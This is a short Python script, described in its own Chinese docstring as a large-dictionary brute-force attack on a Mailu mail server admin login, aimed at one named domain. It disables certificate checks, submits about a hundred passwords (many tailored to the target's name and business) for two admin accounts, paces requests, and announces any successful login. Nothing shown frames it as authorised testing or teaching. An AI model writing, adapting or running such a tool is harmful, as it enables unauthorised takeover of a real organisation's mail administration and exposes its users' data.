#!/usr/bin/env python3
"""Mailu admin大字典爆破"""
import urllib.request, http.cookiejar, ssl, sys, time

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
B = "http://51xyg.com"

def new_opener():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
    op.addheaders = [("User-Agent","Mozilla/5.0")]
    return op

def try_login(email, pw):
    try:
        op = new_opener()
        op.open(f"{B}/sso/login", timeout=6).read()
        data = f"email={email}&pw={pw}&submitAdmin=Sign+in+Admin&pwned=-1".encode()
        r = op.open(urllib.request.Request(f"{B}/sso/login", data=data), timeout=6)
        body = r.read().decode("utf-8","ignore")
        url = r.geturl()
        if "admin" in url and "login" not in url:
            return "SUCCESS"
        return "FAIL"
    except Exception:
        return "ERR"

pwds = ["admin","admin123","123456","mailu","Mailu","admin888","password","12345678",
        "admin@123","mailu123","mailuadmin","admin2024","admin2025","admin2026",
        "changeme","change123","test123","test","123456789","Admin123","Admin888",
        "P@ssw0rd","passw0rd","123123","111111","888888","000000","1234567","12345",
        "654321","abc123","qwerty","admin666","admin999","mailu2020","mailu2021",
        "mailu2022","mailu2023","mailu2024","mailu2025","mailu2026","admin!@#",
        "admin#123","123456a","a123456","Aa123456","admin001","admin002","shipping123",
        "oura123","oura2020","oura2021","oura2022","oura2023","oura2024","oura2025",
        "oura2026","oura-shipping","shipping2020","mailserver","mail2020","Server123",
        "admin@51xyg","xyg123","xyg2020","xyg2021","xyg2022","xyg2023","xyg2024",
        "xyg2025","xyg2026","admin@xyg","51xyg123","1qaz2wsx","qazwsx","zxcvbnm",
        "147258369","159357","abc123456","iloveyou","woaini","5201314","123123123",
        "1234567890","qwe123","zxc123","asd123","asd123456","admin2020","admin2021",
        "admin2022","admin2023","Admin@123","root","root123","toor","adminroot",
        "administrator","Administrator","Admin1234","admin12345"]

for email in ["admin", "admin@51xyg.com"]:
    for pw in pwds:
        r = try_login(email, pw)
        if r == "SUCCESS":
            print(f"!!! {email}/{pw} 登录成功!", flush=True)
            sys.exit(0)
        time.sleep(0.15)
print("DONE", flush=True)
